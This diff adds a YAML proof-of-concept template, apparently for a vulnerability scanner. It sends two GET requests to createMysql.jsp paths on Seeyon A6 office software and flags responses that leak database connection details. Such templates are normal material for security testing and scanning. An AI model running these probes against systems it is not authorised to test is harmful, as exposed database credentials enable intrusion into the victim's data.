@@ -1,0 +1,17 @@
+name: poc-yaml-seeyon-a6-database-info-leak
+groups:
+  poc1:
+    - method: GET
+      path: /yyoa/createMysql.jsp
+      expression:
+        response.status == 200 && response.body.bcontains(b"localhost")
+  poc2:
+    - method: GET
+      path: /yyoa/ext/createMysql.jsp
+      expression:
+        response.status == 200 && response.body.bcontains(b"localhost")
+detail:
+  author: sakura404x
+  version: 致远A6
+  links:
+    - https://github.com/apachecn/sec-wiki/blob/c73367f88026f165b02a1116fe1f1cd2b8e8ac37/doc/unclassified/zhfly3350.md
